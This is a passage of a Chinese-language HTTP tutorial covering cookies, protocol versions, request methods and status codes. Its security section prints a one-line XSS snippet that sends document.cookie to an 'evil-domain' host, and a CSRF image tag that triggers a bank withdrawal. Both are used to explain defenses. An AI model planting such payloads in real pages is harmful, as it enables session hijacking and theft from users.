（本地存储和会话存储）。</p> <h3 id="创建cookie"><a href="#创建cookie" class="header-anchor">#</a> 创建Cookie</h3> <p>当服务器收到HTTP请求时，服务器可以在响应头里面添加一个<code>Set-Cookie</code>选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过<code>Cookie</code>请求头部将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p> <h4 id="set-cookie响应头部和cookie请求头部"><a href="#set-cookie响应头部和cookie请求头部" class="header-anchor">#</a> Set-Cookie响应头部和Cookie请求头部</h4> <p>服务器使用<code>Set-Cookie</code>响应头部向用户代理（一般是浏览器）发送Cookie信息。一个简单的Cookie可能像这样：</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> &lt;cookie名&gt;=&lt;cookie值&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>服务器通过该头部告知客户端保存Cookie信息。</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token response-status">HTTP/1.0 <span class="token property">200 OK</span></span>
<span class="token header-name keyword">Content-type:</span> text/html
<span class="token header-name keyword">Set-Cookie:</span> yummy_cookie=choco
<span class="token header-name keyword">Set-Cookie:</span> tasty_cookie=strawberry<span class="token text-html">

[页面内容]
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>之后，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过Cookie请求头部再发送给服务器。</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">GET</span> /sample_page.html HTTP/1.1</span>
<span class="token header-name keyword">Host:</span> www.example.org
<span class="token header-name keyword">Cookie:</span> yummy_cookie=choco; tasty_cookie=strawberry
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="会话期cookie"><a href="#会话期cookie" class="header-anchor">#</a> 会话期Cookie</h4> <p>会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（<code>Expires</code>）或者有效期（<code>Max-Age</code>）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。</p> <h4 id="持久性cookie"><a href="#持久性cookie" class="header-anchor">#</a> 持久性Cookie</h4> <p>和关闭浏览器便失效的会话期Cookie不同，持久性Cookie可以指定一个特定的过期时间（<code>Expires</code>）或有效期（<code>Max-Age</code>）。</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><blockquote><p>当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p></blockquote> <h4 id="cookie的-secure-和-httponly-标记"><a href="#cookie的-secure-和-httponly-标记" class="header-anchor">#</a> Cookie的 Secure 和 HttpOnly 标记</h4> <p>标记为 <code>Secure</code> 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端。但即便设置了 <code>Secure</code> 标记，敏感信息也不应该通过Cookie传输，因为Cookie有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（<code>http:</code>）无法使用Cookie的 <code>Secure</code> 标记。</p> <p>为避免跨域脚本 (XSS) 攻击，通过JavaScript的 <code>Document.cookie</code> API无法访问带有 <code>HttpOnly</code> 标记的Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 <code>HttpOnly</code> 标记。</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="cookie的作用域"><a href="#cookie的作用域" class="header-anchor">#</a> Cookie的作用域</h4> <p><code>Domain</code> 和 <code>Path</code> 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。</p> <p><code>Domain</code> 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（<strong>不包含子域名</strong>）。如果指定了<code>Domain</code>，则一般包含子域名。</p> <p>例如，如果设置 <code>Domain=mozilla.org</code>，则Cookie也包含在子域名中（如<code>developer.mozilla.org</code>）。</p> <p><code>Path</code> 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 <code>%x2F</code> (&quot;/&quot;) 作为路径分隔符，子路径也会被匹配。</p> <p>例如，设置 <code>Path=/docs</code>，则以下地址都会匹配：</p> <ul><li>/docs</li> <li>/docs/Web/</li> <li>/docs/Web/HTTP</li></ul> <h4 id="javascript通过document-cookie访问cookie"><a href="#javascript通过document-cookie访问cookie" class="header-anchor">#</a> JavaScript通过Document.cookie访问Cookie</h4> <p>通过<code>Document.cookie</code>属性可创建新的Cookie，也可通过该属性访问非<code>HttpOnly</code>标记的Cookie。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">&quot;yummy_cookie=choco&quot;</span><span class="token punctuation">;</span> 
document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">&quot;tasty_cookie=strawberry&quot;</span><span class="token punctuation">;</span> 
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// logs &quot;yummy_cookie=choco; tasty_cookie=strawberry&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><blockquote><p>注意JavaScript可以通过跨站脚本攻击（XSS）的方式来窃取Cookie。</p></blockquote> <h3 id="安全"><a href="#安全" class="header-anchor">#</a> 安全</h3> <div class="custom-block warning"><p class="custom-block-title">注意</p> <p>当机器处于不安全环境时，切记不能通过HTTP Cookie存储、传输敏感信息。</p></div> <h4 id="会话劫持和xss"><a href="#会话劫持和xss" class="header-anchor">#</a> 会话劫持和XSS</h4> <p>在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>HttpOnly</code>类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。</p> <h4 id="跨站请求伪造（csrf）"><a href="#跨站请求伪造（csrf）" class="header-anchor">#</a> 跨站请求伪造（CSRF）</h4> <p>比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：</p> <ul><li>对用户输入进行过滤来阻止XSS；</li> <li>任何敏感操作都需要确认；</li> <li>用于敏感信息的Cookie只能拥有较短的生命周期；</li></ul> <h2 id="版本"><a href="#版本" class="header-anchor">#</a> 版本</h2> <h3 id="http-0-9-单行协议"><a href="#http-0-9-单行协议" class="header-anchor">#</a> HTTP/0.9 – 单行协议</h3> <p>最初版本的HTTP协议并没有版本号，后来它的版本号被定位在 0.9 以区分后来的版本。 HTTP/0.9 极其简单：请求由单行指令构成，以唯一可用方法GET开头，其后跟目标资源的路径（一旦连接到服务器，协议、服务器、端口号这些都不是必须的）。</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code>GET /mypage.html
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>响应也极其简单的：只包含响应文档本身。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML</span><span class="token punctuation">&gt;</span></span>
这是一个非常简单的HTML页面
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTML</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>跟后来的版本不同，HTTP/0.9 的响应内容并不包含HTTP头，这意味着只有HTML文件可以传送，无法传输其他类型的文件；也没有状态码或错误代码：一旦出现问题，一个特殊的包含问题描述信息的HTML文件将被发回，供人们查看。</p> <h3 id="http-1-0-构建可扩展性"><a href="#http-1-0-构建可扩展性" class="header-anchor">#</a> HTTP/1.0 – 构建可扩展性</h3> <p>由于 HTTP/0.9 协议的应用十分有限，浏览器和服务器迅速扩展内容使其用途更广：</p> <ul><li>协议版本信息现在会随着每个请求发送（HTTP/1.0被追加到了GET行）。</li> <li>状态码会在响应开始时发送，使浏览器能了解请求执行成功或失败，并相应调整行为（如更新或使用本地缓存）。</li> <li>引入了HTTP头的概念，无论是对于请求还是响应，允许传输元数据，使协议变得非常灵活，更具扩展性。</li> <li>在新HTTP头的帮助下，具备了传输除纯文本HTML文件以外其他类型文档的能力（Content-Type头）。</li></ul> <p>一个典型的请求看起来就像这样：</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">GET</span> /mypage.html HTTP/1.0</span>
<span class="token header-name keyword">User-Agent:</span> NCSA_Mosaic/2.0 (Windows 3.1)

200 OK
<span class="token header-name keyword">Date:</span> Tue, 15 Nov 1994 08:12:31 GMT
<span class="token header-name keyword">Server:</span> CERN/3.0 libwww/2.17
<span class="token header-name keyword">Content-Type:</span> text/html
&lt;HTML&gt; 
一个包含图片的页面
  &lt;IMG SRC=&quot;/myimage.gif&quot;&gt;
&lt;/HTML&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>接下来是第二个连接，请求获取图片：</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">GET</span> /myimage.gif HTTP/1.0</span>
<span class="token header-name keyword">User-Agent:</span> NCSA_Mosaic/2.0 (Windows 3.1)

200 OK
<span class="token header-name keyword">Date:</span> Tue, 15 Nov 1994 08:12:32 GMT
<span class="token header-name keyword">Server:</span> CERN/3.0 libwww/2.17
<span class="token header-name keyword">Content-Type:</span> text/gif
(这里是图片内容)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="http-1-1-标准化的协议"><a href="#http-1-1-标准化的协议" class="header-anchor">#</a> HTTP/1.1 – 标准化的协议</h3> <p>HTTP/1.0 多种不同的实现方式在实际运用中显得有些混乱，自1995年开始，即HTTP/1.0文档发布的下一年，就开始修订HTTP的第一个标准化版本。在1997年初，HTTP1.1 标准发布，就在HTTP/1.0 发布的几个月后。</p> <p>HTTP/1.1 消除了大量歧义内容并引入了多项改进：</p> <ul><li>连接可以复用，节省了多次打开TCP连接加载网页文档资源的时间。</li> <li>增加管线化技术，允许在第一个应答被完全发送之前就发送第二个请求，以降低通信延迟。</li> <li>支持响应分块。</li> <li>引入额外的缓存控制机制。</li> <li>引入内容协商机制，包括语言，编码，类型等，并允许客户端和服务器之间约定以最合适的内容进行交换。</li> <li>感谢Host头，能够使不同域名配置在同一个IP地址的服务器上。</li></ul> <p>一个典型的请求流程， 所有请求都通过一个连接实现，看起来就像这样：</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">GET</span> /en-US/docs/Glossary/Simple_header HTTP/1.1</span>
<span class="token header-name keyword">Host:</span> developer.mozilla.org
<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
<span class="token header-name keyword">Accept-Language:</span> en-US,en;q=0.5
<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate, br
<span class="token header-name keyword">Referer:</span> https://developer.mozilla.org/en-US/docs/Glossary/Simple_header

200 OK
<span class="token header-name keyword">Connection:</span> Keep-Alive
<span class="token header-name keyword">Content-Encoding:</span> gzip
<span class="token header-name keyword">Content-Type:</span> text/html; charset=utf-8
<span class="token header-name keyword">Date:</span> Wed, 20 Jul 2016 10:55:30 GMT
<span class="token header-name keyword">Etag:</span> &quot;547fa7e369ef56031dd3bff2ace9fc0832eb251a&quot;
<span class="token header-name keyword">Keep-Alive:</span> timeout=5, max=1000
<span class="token header-name keyword">Last-Modified:</span> Tue, 19 Jul 2016 00:59:33 GMT
<span class="token header-name keyword">Server:</span> Apache
<span class="token header-name keyword">Transfer-Encoding:</span> chunked
<span class="token header-name keyword">Vary:</span> Cookie, Accept-Encoding<span class="token text-html">

(content)


</span><span class="token request-line"><span class="token property">GET</span> /static/img/header-background.png HTTP/1.1</span>
<span class="token header-name keyword">Host:</span> developer.cdn.mozilla.net
<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
<span class="token header-name keyword">Accept:</span> */*
<span class="token header-name keyword">Accept-Language:</span> en-US,en;q=0.5
<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate, br
<span class="token header-name keyword">Referer:</span> https://developer.mozilla.org/en-US/docs/Glossary/Simple_header

200 OK
<span class="token header-name keyword">Age:</span> 9578461
<span class="token header-name keyword">Cache-Control:</span> public, max-age=315360000
<span class="token header-name keyword">Connection:</span> keep-alive
<span class="token header-name keyword">Content-Length:</span> 3077
<span class="token header-name keyword">Content-Type:</span> image/png
<span class="token header-name keyword">Date:</span> Thu, 31 Mar 2016 13:34:46 GMT
<span class="token header-name keyword">Last-Modified:</span> Wed, 21 Oct 2015 18:27:50 GMT
<span class="token header-name keyword">Server:</span> Apache

(image content of 3077 bytes)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><h3 id="http-2-为了更优异的表现"><a href="#http-2-为了更优异的表现" class="header-anchor">#</a> HTTP/2 - 为了更优异的表现</h3> <p>这些年来，网页愈渐变得的复杂，甚至演变成了独有的应用，可见媒体的播放量，增进交互的脚本大小也增加了许多：更多的数据通过HTTP请求被传输。HTTP/1.1链接需要请求以正确的顺序发送，理论上可以用一些并行的链接（尤其是5到8个），带来的成本和复杂性堪忧。比如，HTTP管线化（pipelining）就成为了Web开发的负担。</p> <p>在2010年到2015年，谷歌通过实践了一个实验性的SPDY协议，证明了一个在客户端和服务器端交换数据的另类方式。其收集了浏览器和服务器端的开发者的焦点问题。明确了响应数量的增加和解决复杂的数据传输，SPDY成为了HTTP/2协议的基础。</p> <p>HTTP/2在HTTP/1.1有几处基本的不同:</p> <ul><li>HTTP/2是二进制协议而不是文本协议。不再可读，也不可无障碍的手动创建，改善的优化技术现在可被实施。</li> <li>这是一个复用协议。并行的请求能在同一个链接中处理，移除了HTTP/1.x中顺序和阻塞的约束。</li> <li>压缩了headers。因为headers在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本。</li> <li>其允许服务器在客户端缓存中填充数据，通过一个叫服务器推送的机制来提前请求。</li></ul> <p>在2015年5月正式标准化后，HTTP/2取得了极大的成功，在2016年7月前，8.7%的站点已经在使用它，代表超过68%的请求[2] 。高流量的站点最迅速的普及，在数据传输上节省了可观的成本和支出。</p> <p>这种迅速的普及率很可能是因为HTTP2不需要站点和应用做出改变：使用HTTP/1.1和HTTP/2对他们来说是透明的。拥有一个最新的服务器和新点的浏览器进行交互就足够了。只有一小部分群体需要做出改变，而且随着陈旧的浏览器和服务器的更新，而不需Web开发者做什么，用的人自然就增加了。</p> <h3 id="后http-2进化"><a href="#后http-2进化" class="header-anchor">#</a> 后HTTP/2进化</h3> <p>随着HTTP/2.的发布，就像先前的HTTP/1.x一样，HTTP没有停止进化，HTTP的扩展性依然被用来添加新的功能。特别的，我们能列举出2016年里HTTP的新扩展：</p> <ul><li>对Alt-Svc的支持允许了给定资源的位置和资源鉴定，允许了更智能的CDN缓冲机制。</li> <li>Client-Hints 的引入允许浏览器或者客户端来主动交流它的需求，或者是硬件约束的信息给服务端。</li> <li>在Cookie头中引入安全相关的的前缀，现在帮助保证一个安全的cookie没被更改过。</li></ul> <p>HTTP的进化证实了它良好的扩展性和简易性，释放了很多应用程序的创造力并且情愿使用这个协议。今天的HTTP的使用环境已经于早期1990年代大不相同。HTTP的原先的设计不负杰作之名，允许了Web在25年间和平稳健得发展。修复漏洞，同时却也保留了使HTTP如此成功的灵活性和扩展性，HTTP/2的普及也预示着这个协议的大好前程。</p> <h3 id="http-3-http-over-quic"><a href="#http-3-http-over-quic" class="header-anchor">#</a> HTTP/3 - HTTP over QUIC</h3> <p>HTTP的下一个主要版本HTTP / 3将在传输层部分使用QUIC代替TCP / TLS。</p> <h2 id="http-报文-2"><a href="#http-报文-2" class="header-anchor">#</a> HTTP 报文</h2> <h3 id="请求方法"><a href="#请求方法" class="header-anchor">#</a> 请求方法</h3> <p>HTTP 定义了一组请求方法, 以表明要对给定资源执行的操作。指示针对给定资源要执行的期望动作. 虽然他们也可以是名词, 但这些请求方法有时被称为HTTP动词. 每一个请求方法都实现了不同的语义, 但一些共同的特征由一组共享:例如一个请求方法可以是 safe, idempotent, 或 cacheable。</p> <ul><li>GET
<ul><li>GET方法请求一个指定资源的表示形式. 使用GET的请求应该只被用于获取数据.</li></ul></li> <li>HEAD
<ul><li>HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体.</li> <li>HEAD方法的一个使用场景是在下载一个大文件前先获取其大小再决定是否要下载, 以此可以节约带宽资源。</li></ul></li> <li>POST
<ul><li>POST方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用.</li> <li>POST方法发送数据给服务器. 请求主体的类型由 Content-Type 首部指定.</li></ul></li> <li>PUT
<ul><li>PUT方法用请求有效载荷替换目标资源的所有当前表示。</li> <li>PUT方法使用请求中的负载创建或者替换目标资源。</li> <li>PUT 和POST方法的区别是,PUT方法是幂等的：连续调用一次或者多次的效果相同（无副作用）。连续调用同一个POST可能会带来额外的影响，比如多次提交订单。</li></ul></li> <li>DELETE
<ul><li>DELETE方法删除指定的资源。</li></ul></li> <li>CONNECT
<ul><li>CONNECT方法建立一个到由目标资源标识的服务器的隧道。</li> <li>CONNECT方法实现用隧道协议进行TCP通信。</li> <li>主要使用SSL(安全套接层)和TLS（传输层安全）协议把通信内容加密后经网络隧道传输。</li> <li>CONNECT是一个应用范围为点到点的方法。</li></ul></li> <li>OPTIONS
<ul><li>OPTIONS方法用于描述目标资源的通信选项。</li> <li>客户端可以对特定的 URL 使用 OPTIONS 方法，也可以对整站（通过将 URL 设置为“*”）使用该方法。</li></ul></li> <li>TRACE
<ul><li>TRACE方法沿着到目标资源的路径执行一个消息环回测试。</li> <li>提供了一种实用的 debug 机制。</li> <li>请求的最终接收者应当原样返回它接收到的消息，作为一个<code>Content-Type</code> 为 <code>message/http</code>  的200（OK）响应的消息的主体（body）返回给客户端 。</li></ul></li> <li>PATCH
<ul><li>PATCH方法用于对资源应用部分修改。</li> <li>不同于  PUT 方法，而与 POST 方法类似，PATCH  方法是非幂等的，这就意味着连续多个的相同请求会产生不同的效果。</li></ul></li></ul> <h3 id="状态码"><a href="#状态码" class="header-anchor">#</a> 状态码</h3> <p>HTTP 响应状态代码指示特定 HTTP 请求是否已成功完成。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)。</p> <h4 id="信息响应-100-199"><a href="#信息响应-100-199" class="header-anchor">#</a> 信息响应(100–199)</h4> <ul><li>100 Continue
<ul><li>这个临时响应表明，迄今为止的所有内容都是可行的，客户端应该继续请求，如果已经完成，则忽略它。</li></ul></li> <li>101 Switching Protocol
<ul><li>该代码是响应客户端的 Upgrade 标头发送的，并且指示服务器也正在切换的协议。</li></ul></li> <li>102 Processing (WebDAV)
<ul><li>此代码表示服务器已收到并正在处理该请求，但没有响应可用。</li></ul></li> <li>103 Early Hints
<ul><li>此状态代码主要用于与Link 链接头一起使用，以允许用户代理在服务器仍在准备响应时开始预加载资源。</li></ul></li></ul> <h4 id="成功响应-200-299"><a href="#成功响应-200-299" class="header-anchor">#</a> 成功响应(200–299)</h4> <ul><li><strong>200 OK</strong> <ul><li>请求成功。成功的含义取决于HTTP方法：
<ul><li>GET：资源已被提取并在消息正文中传输。</li> <li>HEAD：实体标头位于消息正文中。</li> <li>POST：描述动作结果的资源在消息体中传输。</li> <li>TRACE：消息正文包含服务器收到的请求消息</li></ul></li></ul></li> <li><strong>201 Created</strong> <ul><li>该请求已成功，并因此创建了一个新的资源。这通常是在POST请求，或是某些PUT请求之后返回的响应。</li></ul></li> <li><strong>202 Accepted</strong> <ul><li>请求已经接收到，但还未响应，没有结果。意味着不会有一个异步的响应去表明当前请求的结果，预期另外的进程和服务去处理请求，或者批处理。</li></ul></li> <li>203 Non-Authoritative Information
<ul><li>服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。例如，包含资源的元数据可能导致原始服务器知道元信息的超集。使用此状态码不是必须的，而且只有在响应不使用此状态码便会返回200 OK的情况下才是合适的。</li></ul></li> <li><strong>204 No Content</strong> <ul><li>服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。由于204响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。</li></ul></li> <li>205 Reset Content
<ul><li>服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。与204响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。</li></ul></li> <li><strong>206 Partial Content</strong> <ul><li>服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。</li></ul></li> <li>207 Multi-Status (WebDAV)
<ul><li>由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</li></ul></li> <li>208 Already Reported (WebDAV)
<ul><li>在 DAV 里面使用: propstat 响应元素以避免重复枚举多个绑定的内部成员到同一个集合。</li></ul></li> <li>226 IM Used (HTTP Delta encoding)
<ul><li>服务器已经完成了对资源的 GET 请求，并且响应是对当前实例应用的一个或多个实例操作结果的表示。</li></ul></li></ul> <h4 id="重定向-300-399"><a href="#重定向-300-399" class="header-anchor">#</a> 重定向(300–399)</h4> <ul><li>300 Multiple Choice
<ul><li>被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。</li></ul></li> <li><strong>301 Moved Permanently</strong> <ul><li>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。</li></ul></li> <li><strong>302 Found</strong> <ul><li>请求的资源现在临时从不同的 URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。</li></ul></li> <li><strong>303 See Other</strong> <ul><li>对应当前请求的响应可以在另一个 URI 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。</li></ul></li> <li><strong>304 Not Modified</strong> <ul><li>如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304 响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。</li></ul></li> <li><strong>307 Temporary Redirect</strong> <ul><li>请求的资源现在临时从不同的URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。</li></ul></li> <li>308 Permanent Redirect
<ul><li>这意味着资源现在永久位于由 Location: HTTP Response 标头指定的另一个 URI。 这与 301 Moved Permanently HTTP 响应代码具有相同的语义，但用户代理不能更改所使用的 HTTP 方法：如果在第一个请求中使用 POST，则必须在第二个请求中使用 POST。</li></ul></li></ul> <h4 id="客户端错误-400-499"><a href="#客户端错误-400-499" class="header-anchor">#</a> 客户端错误(400–499)</h4> <ul><li><strong>400 Bad Request</strong> <ul><li>语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。</li> <li>请求参数有误。</li></ul></li> <li><strong>401 Unauthorized</strong> <ul><li>当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。</li></ul></li> <li><strong>402 Payment Required</strong> <ul><li>此响应码保留以便将来使用，创造此响应码的最初目的是用于数字支付系统，然而现在并未使用。</li></ul></li> <li><strong>403 Forbidden</strong> <ul><li>服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个 404 响应，假如它不希望让客户端获得任何信息。</li></ul></li> <li><strong>404 Not Found</strong> <ul><li>请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</li></ul></li> <li><strong>405 Method Not Allowed</strong> <ul><li>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。 鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</li></ul></li> <li>406 Not Acceptable
